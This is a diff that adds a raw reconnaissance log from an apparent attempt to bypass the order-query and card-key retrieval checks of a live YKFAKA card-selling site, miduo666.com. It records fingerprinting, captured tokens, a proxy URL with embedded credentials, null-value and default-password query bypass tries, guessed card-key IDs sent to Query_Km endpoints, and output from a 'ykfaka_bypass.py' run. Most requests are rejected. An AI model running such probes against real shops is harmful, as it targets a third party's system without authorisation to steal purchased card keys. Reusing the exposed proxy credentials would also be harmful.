@@ -1,0 +1,215 @@
+===== RECON LOG HEAD =====
+PROXY=
+WARM=200
+===== DNS / fingerprint =====
+223.254.146.190 miduo666.com
+len 16799
+title 首页-优卡自动发卡网
+YKFAKA => ['YKFAKA']
+author[^>]+ => ['author" content="YKFAKA" /']
+Get_Yk_KC => ['Get_Yk_KC']
+Query\.html => ['Query.html']
+USDT => ['USDT']
+@[A-Za-z0-9_]{4,} => ['@gj988', '@miduo2026_bot']
+metas ['<meta charset="UTF-8">', '<meta name="author" content="YKFAKA" />', '<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">', '<meta http-equiv="X-UA-Compatible" content="ie=edge">', '<meta content="优卡发卡,YKFAKA,自动发卡,个人自动发卡,自动发货,免签约支付接口,24小时自动发货" name="Keywords">', '<meta name="description" content="YKFAKA[优卡发卡]自动发卡网是一款个人和商家均适合使用的一款全新的发卡网系统，支持微信、支付宝、USDT、QQ钱包收款,支持7X24无人值守自动发货" />']
+===== SUCCESS mima1314: value=null Query.html =====
+Query:200
+len 5736
+tokens ['1ce588474754468056d4ae814b48bc8bfb674d41']
+geetest True
+hints ['查询', '订单', '订单', '查询', '订单', '密码', '密码', '验证']
+TOKEN=1ce588474754468056d4ae814b48bc8bfb674d41
+PROXY=http://C413ED6D:344F550A6F8B@123.189.50.177:14398
+NULL_POST:200 size:12
+len 4
+Query_Km links 0 unique 0
+ddid attrs []
+order links []
+contains 非法
+snip 请求非法
+===== pull Query_Km samples =====
+no ddids from null — try Query_Km rate / random
+km 000000000001 => HTTP200 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta n
+km deadbeefcafe => HTTP200 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta n
+km aaaaaaaaaaaa => HTTP200 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta n
+km 123456789abc => HTTP200 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta n
+===== SUCCESS qd93/79yj (expect N/A) =====
+https://miduo666.com/?mod=query&data=1 => 200
+https://miduo666.com/shop/ => 500
+https://miduo666.com/ajax.php?act=getcount => 404
+https://miduo666.com/api.php?act=siteinfo => 404
+===== stock Get_Yk_KC =====
+gids []
+links ['/public/static/AmazeUI/css/amazeui.css', '/public/static/css/style.css', '/public/static/layui/layui/css/layui.css', '/', '/', 'javascript:;', 'http://wpa.qq.com/msgrd?v=3&uin=123&site=qq&menu=yes', 'http://wpa.qq.com/msgrd?v=3&uin=123&site=qq&menu=yes', 'http://wpa.qq.com/msgrd?v=3&uin=123&site=qq&menu=yes', '/News_List.html?page=1&limit=15', '/User_Login.html', '/Gd_Query.html', '/Query.html', '/Item/2.html', '/Trade/7.html', '/Trade/7.html', '/Trade/8.html', '/Trade/8.html', '/Trade/9.html', '/Trade/9.html', '/Trade/10.html', '/Trade/10.html', '/Trade/11.html', '/Trade/11.html', '/Trade/12.html', '/Trade/12.html', '/Item/4.html', '/Trade/13.html', '/Trade/13.html', '/Trade/14.html']
+/Trade.html => 500
+/trade.html => 500
+/Goods.html => 500
+/List.html => 500
+/index/index => 500
+/user/login => 500
+KC gid=1 => <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Error</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <style>
+        /* B
+KC gid=2 => <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Error</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <style>
+        /* B
+KC gid=3 => <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Error</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <style>
+        /* B
+KC gid=4 => <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Error</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <style>
+        /* B
+KC gid=5 => <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Error</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <style>
+        /* B
+KC gid=6 => <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Error</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <style>
+        /* B
+KC gid=7 => <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Error</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <style>
+        /* B
+KC gid=8 => <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Error</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <style>
+        /* B
+KC gid=9 => <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Error</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <style>
+        /* B
+===== null_p1 / km samples =====
+00000000: e8af b7e6 b182 e99d 9ee6 b395            ............
+--- km ---
+== home.html len=16799 ==
+== km_000000000001.html len=1965 ==
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes" /> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <title>跳转提示</title> <style 
+== km_123456789abc.html len=1965 ==
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes" /> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <title>跳转提示</title> <style 
+== km_aaaaaaaaaaaa.html len=1965 ==
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes" /> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <title>跳转提示</title> <style 
+== km_deadbeefcafe.html len=1965 ==
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes" /> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <title>跳转提示</title> <style 
+== null_p1.html len=4 ==
+请求非法
+== pay_get.html len=1996 ==
+== query.html len=5736 ==
+== qval.html len=1996 ==
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes" /> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <title>跳转提示</title> <style 
+PROXY=218.67.20.27:13382
+title 首页-优卡自动发卡网
+/Trade[^\"\']* ['/Trade/7.html', '/Trade/8.html', '/Trade/9.html', '/Trade/10.html', '/Trade/11.html', '/Trade/12.html', '/Trade/13.html', '/Trade/14.html', '/Trade/15.html']
+href=["\']([^\"\']+)["\'] ['/public/static/AmazeUI/css/amazeui.css', '/public/static/css/style.css', '/public/static/layui/layui/css/layui.css', '/', 'javascript:;', 'http://wpa.qq.com/msgrd?v=3&uin=123&site=qq&menu=yes', '/News_List.html?page=1&limit=15', '/User_Login.html', '/Gd_Query.html', '/Query.html', '/Item/2.html', '/Trade/7.html', '/Trade/8.html', '/Trade/9.html', '/Trade/10.html', '/Trade/11.html', '/Trade/12.html', '/Item/4.html', '/Trade/13.html', '/Trade/14.html', '/Trade/15.html']
+YKFAKA True
+author ['YKFAKA']
+Taddr []
+tg ['@gj988', '@miduo2026_bot']
+===== Query with pass=Ykfaka999 (no captcha) =====
+TOKEN=871a837afb3dba95c1b9bdec1fa4ce5d863f906f
+POST 200 size=12
+ len 4 kms 0 snip 请求非法
+  has 非法
+POST 200 size=2052
+ len 1996 kms 0 snip <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum
+POST 200 size=2052
+ len 1996 kms 0 snip <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum
+POST 200 size=2052
+ len 1996 kms 0 snip <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum
+===== Get_Yk_KC.json style / alternate =====
+500 https://miduo666.com/Get_Yk_KC.html?gid=1 => <!DOCTYPE html> <html> <head>     <meta charset="UTF-8">     <title>Error</title>     <meta name="robots" content="noind
+500 https://miduo666.com/get_yk_kc.html?gid=1 => <!DOCTYPE html> <html> <head>     <meta charset="UTF-8">     <title>Error</title>     <meta name="robots" content="noind
+500 https://miduo666.com/index/get_yk_kc?gid=1 => <!DOCTYPE html> <html> <head>     <meta charset="UTF-8">     <title>Error</title>     <meta name="robots" content="noind
+500 https://miduo666.com/index/index/get_yk_kc?gid=1 => <!DOCTYPE html> <html> <head>     <meta charset="UTF-8">     <title>Error</title>     <meta name="robots" content="noind
+===== Pay messages =====
+paytype=udpay len 1996
+[]
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes" 
+paytype=alipay len 1996
+[]
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes" 
+500 https://miduo666.com/Trade.html?gid=1 title=Error
+500 https://miduo666.com/trade?gid=1 title=Error
+500 https://miduo666.com/Goods.html title=Error
+500 https://miduo666.com/List.html title=Error
+===== run ykfaka_bypass.py against miduo =====
+    "alts": [
+      {
+        "path": "/Query.html?page=1&value=null",
+        "status": 200,
+        "len": 5738,
+        "snip": "<!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta name=\"author\" content=\""
+      },
+      {
+        "path": "/Query_Km/000000000001",
+        "status": 200,
+        "len": 1965,
+        "snip": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtm"
+      },
+      {
+        "path": "/Get_Yk_KC.html?ddid=000000000001",
+        "status": 500,
+        "len": 6482,
+        "snip": "<!DOCTYPE html> <html> <head>     <meta charset=\"UTF-8\">     <title>Error</title>     <meta name=\"ro"
+      },
+      {
+        "path": "/R_YkPay/000000000001",
+        "status": 200,
+        "len": 4,
+        "snip": "fail"
+      },
+      {
+        "path": "/Pay",
+        "status": 200,
+        "len": 1996,
+        "snip": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtm"
+      },
+      {
+        "path": "/Trade/1.html",
+        "status": 200,
+        "len": 8181,
+        "snip": "<!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta name=\"author\" content=\""
+      }
+    ]
+  }
+]
